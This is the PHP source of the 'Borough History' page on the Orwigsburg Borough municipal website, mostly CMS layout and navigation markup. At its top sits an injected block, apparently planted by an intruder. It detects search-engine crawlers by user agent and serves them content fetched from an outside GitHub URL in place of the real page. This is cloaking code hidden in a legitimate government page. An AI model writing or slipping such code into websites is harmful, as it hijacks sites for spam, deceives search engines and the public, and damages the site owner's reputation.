<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburg.govhistory';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>
<!doctype html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />

	<title>Borough History</title>

    <meta name="theme-version" content="1.8.1" />
    <meta name="foundation-version" content="5.5.4" />
    <meta name="modernizr-version" content="3.6.0" />

	
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="index, follow" />
		
	<meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="Borough History">
	<meta name="twitter:url" content="https://orwigsburg.gov/history/index.php">
	<meta property="og:type" content="website">
	<meta property="og:site_name" content="Orwigsburg Borough">
	<meta property="og:title" content="Borough History">
	<meta property="og:url" content="https://orwigsburg.gov/history/index.php">

	<link rel="stylesheet" type="text/css" media="all" href="../rw_common/themes/foundation/consolidated.css" />
		
	<script>var foundation={};</script>
	<script>function loadCSS(a,b,c){"use strict";var d=window.document.createElement("link"),e=b||window.document.getElementsByTagName("script")[0],f=window.document.styleSheets;return d.rel="stylesheet",d.href=a,d.media="only x",e.parentNode.insertBefore(d,e),d.onloadcssdefined=function(a){for(var b,c=0;c<f.length;c++)f[c].href&&f[c].href===d.href&&(b=!0);b?a():setTimeout(function(){d.onloadcssdefined(a)})},d.onloadcssdefined(function(){d.media=c||"all"}),d}</script>

	

			<link rel='stylesheet' type='text/css' media='all' href='../rw_common/plugins/stacks/stacks.css' />
<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page50.css' />
        <script type='text/javascript' charset='utf-8' src='../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
        
        <link rel="stylesheet" href="../rw_common/plugins/stacks/font-awesome.min.css">
        
<script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/imagesloaded.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/onimpression.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/moment-with-locales.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/mustache.min.js"></script>		
		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page50.js'></script>
		






	<script>var jQuery=stacks.jQuery,$=jQuery;</script>
	
</head>

<body class="antialiased">

<div id="foundation-loader"></div>



 <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 
<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '>
	
	






<?php
	setlocale(LC_ALL, 'en'.strtoupper('_en.UTF-8'));
	$process_macros = true;
	$macro_prefix = '';
?>





 
 
</div></div><div id='stacks_out_23' class='stacks_out'><div id='stacks_in_23' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
</div></div><div id='stacks_out_24' class='stacks_out'><div id='stacks_in_24' class='stacks_in '><div id='stacks_out_24_3' class='stacks_out'><div id='stacks_in_24_3' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse      '  > <div class='columns small-12  small-centered      '> <div id='stacks_out_24_5' class='stacks_out'><div id='stacks_in_24_5' class='stacks_in com_joeworkman_stacks_foundation_iconbar_s3_stack'><nav class="icon-bar horizontal custom " role="navigation">  <a role="button" tabindex="0" href="tel:570-366-3103" class="item " rel="">   <i class="fa fa-phone"></i>   </a> 
 <a role="button" tabindex="0" href="../map/" class="item " rel="">   <i class="fa fa-map-marker"></i>   </a> 
 <a role="button" tabindex="0" href="https://www.facebook.com/orwigsburg" class="item " rel="external">   <i class="fa fa-facebook"></i>   </a> 
  <a role="button" tabindex="0" data-reveal-id="email" class="item">    <i class="fa fa-envelope"></i>   </a> 
 </nav> 
</div></div><div id='stacks_out_24_41' class='stacks_out'><div id='stacks_in_24_41' class='stacks_in com_joeworkman_stacks_foundation_reveal_stack'> <div id="email" class="reveal-lightbox reveal-modal small  " style="" aria-hidden="true" role="dialog" data-reveal> <div id='stacks_out_24_46' class='stacks_out'><div id='stacks_in_24_46' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-01");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_31' class='stacks_out'><div id='stacks_in_24_31' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_36' class='stacks_out'><div id='stacks_in_24_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-01)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_37' class='stacks_out'><div id='stacks_in_24_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-01)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_35' class='stacks_out'><div id='stacks_in_24_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-01)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_45' class='stacks_out'><div id='stacks_in_24_45' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-02");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_68' class='stacks_out'><div id='stacks_in_24_68' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_69' class='stacks_out'><div id='stacks_in_24_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-02)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_71' class='stacks_out'><div id='stacks_in_24_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-02)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_73' class='stacks_out'><div id='stacks_in_24_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-02)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_75' class='stacks_out'><div id='stacks_in_24_75' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-03");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_78' class='stacks_out'><div id='stacks_in_24_78' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_79' class='stacks_out'><div id='stacks_in_24_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-03)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_81' class='stacks_out'><div id='stacks_in_24_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-03)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_83' class='stacks_out'><div id='stacks_in_24_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-03)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_85' class='stacks_out'><div id='stacks_in_24_85' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-04");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_88' class='stacks_out'><div id='stacks_in_24_88' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_89' class='stacks_out'><div id='stacks_in_24_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-04)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_91' class='stacks_out'><div id='stacks_in_24_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-04)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_93' class='stacks_out'><div id='stacks_in_24_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-04)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_95' class='stacks_out'><div id='stacks_in_24_95' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-05");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_48' class='stacks_out'><div id='stacks_in_24_48' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_49' class='stacks_out'><div id='stacks_in_24_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-05)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_51' class='stacks_out'><div id='stacks_in_24_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-05)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_53' class='stacks_out'><div id='stacks_in_24_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-05)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_55' class='stacks_out'><div id='stacks_in_24_55' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-06");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_116' class='stacks_out'><div id='stacks_in_24_116' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_117' class='stacks_out'><div id='stacks_in_24_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-06)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_119' class='stacks_out'><div id='stacks_in_24_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-06)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_121' class='stacks_out'><div id='stacks_in_24_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-06)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_123' class='stacks_out'><div id='stacks_in_24_123' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-07");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_127' class='stacks_out'><div id='stacks_in_24_127' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_128' class='stacks_out'><div id='stacks_in_24_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-07)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_130' class='stacks_out'><div id='stacks_in_24_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-07)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_132' class='stacks_out'><div id='stacks_in_24_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-07)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_134' class='stacks_out'><div id='stacks_in_24_134' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-08");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_138' class='stacks_out'><div id='stacks_in_24_138' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_139' class='stacks_out'><div id='stacks_in_24_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-08)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_141' class='stacks_out'><div id='stacks_in_24_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-08)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_143' class='stacks_out'><div id='stacks_in_24_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-08)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_145' class='stacks_out'><div id='stacks_in_24_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("email-show-togg-09");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_24_149' class='stacks_out'><div id='stacks_in_24_149' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_150' class='stacks_out'><div id='stacks_in_24_150' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-name-09)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_152' class='stacks_out'><div id='stacks_in_24_152' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(email-position-09)%    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_24_154' class='stacks_out'><div id='stacks_in_24_154' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:%cmsText(email-address-09)%" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_24_156' class='stacks_out'><div id='stacks_in_24_156' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
 <a class="close-reveal-modal" aria-label="close" style="">&#215;</a> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_24_1' class='stacks_out'><div id='stacks_in_24_1' class='stacks_in com_joeworkman_stacks_foundation_topbar_s3_stack'>


<div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
        <ul class="title-area title-area-site-setup">
            <li class="name ">
                
                    <a href="https://orwigsburg.gov/">
                        
                            <span class="show-for-medium-up"><img src="../rw_common/images/Borough-logo-png-500-tiny.png" width="500" height="475" alt="Orwigsburg Borough"/></span>
                        
                        
                            <h1 class="site-title font-family-h1 ">
                                Orwigsburg Borough
                                
                            </h1>
                        
                    </a>
                

                
            </li>
            <li class="toggle-topbar menu-icon">
                <a href="#">
                    <span>MENU</span>
                </a>
            </li>
        </ul>

        <section class="top-bar-section font-family-h2 menu-rw">







    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/" rel="">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/" rel="">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../live/" rel="">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../live/schools/" rel="">Schools</a></li><li class="has-dropdown" role="menuitem"><a href="../live/library/" rel="">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../live/orgs/" rel="">Organizations</a></li></ul></li></ul>










        </section>
    </nav>
</div>



</div></div></div></div><div id='stacks_out_257' class='stacks_out'><div id='stacks_in_257' class='stacks_in '><div id='stacks_out_257_9' class='stacks_out'><div id='stacks_in_257_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 


<?php
$stacks_in_257_10_effect = 1;
function animation_stacks_in_257_10()
{
    $random = true;
    $zoom = array('kb-zoom-in','kb-zoom-out');
    $e = array_rand($zoom, 1);
    if ($random) {
        $number = rand(1, 4);
    } else {
        global $stacks_in_257_10_effect;
        $stacks_in_257_10_effect = $stacks_in_257_10_effect >= 4 ? 1 : $stacks_in_257_10_effect + 1;
        $number = $stacks_in_257_10_effect;
    }
    return "$zoom[$e]-$number-stacks_in_257_10 kb-anim animated";
}
?>



   




   


<!-- Total Impact Gallery -->
<?php

$sort    = "default";
$caption = "h3";
$mobile  = false;
$effects = false;

if ($publish) {
    $totalgallery = new \TotalCMS\Component\Gallery("header-slides");
    $totalgallery->process_data();
    $images  = $sort == "old" ? $totalgallery->images : array_reverse($totalgallery->images);
} else {
    $totalgallery = new totalpreview("gallery");
    $images  = $sort == "old" ? $totalgallery->get_gallery("header-slides") : array_reverse($totalgallery->get_gallery("header-slides"));
}

if ($sort == "shuffle") {
    shuffle($images);
}

foreach (array_slice($images, 0, 5) as $image) {
    $alt    = $image["alt"];
    $img    = $image["img"];
    $thumb  = $image["thumb"]["th"];
    $effect = $effects ? animation_stacks_in_257_10() : "";

    if ($caption != "none" && $alt != "") {
        $content  = $caption == "markdown" ? $totalgallery->format_text(htmlspecialchars($alt)) : "<$caption class=\"text-center fn-text-sw5c1\">$alt</$caption>";
        echo "<li class=\"impact-slide slide slide-stacks_in_257_10 fg-content $effect\">";

        if ($mobile) {
            
            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$thumb\" alt=\"$alt\" data-interchange=\"[https://orwigsburg.gov/$thumb,(default)],[https://orwigsburg.gov/$img,(medium)]\"/>";
            
        } else {
            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$img\" alt=\"$alt\"/>";
        }

        echo "<div class=\"impact-container h-right v-bottom\">
                <div class=\"slide-content\" class=\"text-center fn-text-sw5c1\">$content</div>
            </div>
        </li>";
    } else {
        if ($mobile) {
            echo "<li class=\"impact-slide slide slide-stacks_in_257_10 $effect\">";
            
            echo "<img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$thumb\" alt=\"$alt\" data-interchange=\"[https://orwigsburg.gov/$thumb,(default)],[https://orwigsburg.gov/$img,(medium)]\"/>";
            
            echo "</li>";
        } else {
            echo "<li class=\"impact-slide slide slide-stacks_in_257_10 $effect\">
                <img oncontextmenu=\"return false;\" draggable=\"false\" class=\"impact-image\" src=\"https://orwigsburg.gov/$img\" alt=\"$alt\"/>
            </li>";
        }
    }
}
?>























 </ul> <nav class="slides-navigation"> <a href="#" class="next"></a> <a href="#" class="prev"></a> </nav>  </div>  </div>  
</div></div></div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_4' class='stacks_out'><div id='stacks_in_4' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >%cmsText(history-headline)%</h1> 
</div></div><!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("history-descript-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(history-descript)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<div id='stacks_out_140' class='stacks_out'><div id='stacks_in_140' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_258' class='stacks_out'><div id='stacks_in_258' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(history-content)%    
 
</div></div><div id='stacks_out_285' class='stacks_out'><div id='stacks_in_285' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div class="total-blog-list blog_stacks_in_259 grid  " data-slug="history">


<?php
$post_template = <<<POSTTEMPLATE
<article class="post  {{#authorlink}}author-{{authorlink}}{{/authorlink}} {{#genrelink}}genre-{{genrelink}}{{/genrelink}} {{#categories}}category-{{link}} {{/categories}} {{#tags}}tag-{{link}} {{/tags}} {{#labels}}label-{{link}} {{/labels}}   {{# featured }}featured{{/ featured }} {{# draft }}draft{{/ draft }} {{# archived }}archived{{/ archived }}">




<div class="default-layout">
  <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}">  <div class="post_layout_wrapper    layout1_stacks_in_260    " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_261   height-fixed " style=""> <div class="post_column1">  <h3 class="post-title  text-center  "><a href="{{ url }}" title="{{aria}} {{title}}">{{{ title }}}</a> <small> {{{ author }}}</small></h3>    
</div>  </div>  
 <div class="post-image-wrapper stacks_in_264"> <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}"> {{#slideshow}} <ul class="post-image     {{ type }}" data-orbit data-options="animation:fade;pause_on_hover:false;navigation_arrows:true;slide_number:false;bullets:false;circular:true;timer:true;animation_speed:1500;timer_speed:{{timer}};"> {{/slideshow}} {{^slideshow}} <ul class="post-image     {{ type }}"> {{/slideshow}} {{#gallery}}  <li><img loading="auto" class="" src="{{ thumb.sq }}" alt="{{ alt }}"></li>  {{/gallery}} {{^ gallery }}    {{/ gallery }} </ul> </a> </div>   
    <div class="post_layout_wrapper    layout1_stacks_in_265    " style=""> <div class="post_column1"> <time class="post-date  text-right  " datetime="{{ datetime }}" data-dateformat='MM-DD-YYYY' content="{{ datetime }}">{{ datetime }}</time>   
 <div class="post-categories  stacks_in_267 text-left  ">Department:  {{#categories}} <span> <a href="?category={{link}}" title="{{aria}} {{label}}">   {{label}} </a> </span> {{/categories}} </div>    
 <div class="post-tags stacks_in_268 text-left  ">Tags: {{#tags}} <span> <a href="?tag={{link}}" title="{{label}}">   {{label}} </a> </span> {{/tags}} </div>    
</div>  </div>  
    <div class="post_layout_wrapper    layout1_stacks_in_270    " style=""> <div class="post_column1"> <div class="post-summary  fr-view text-left  " >{{{ summary }}}</div>   
</div>  </div>  
</div>  </div> </a> 
    <div class="post_layout_wrapper    layout1_stacks_in_274    " style=""> <div class="post_column1"><div class='slice empty out'><div class='slice empty in'></div></div></div>  </div>  
 <a role="button" href="{{ url }}" title="{{aria}} {{title}}" class="stacks_in_276  button readmore fixed-bottom  centered small custom radius">Details</a>   

</div>






</article>
POSTTEMPLATE;
?>




<?php
if ($publish) {
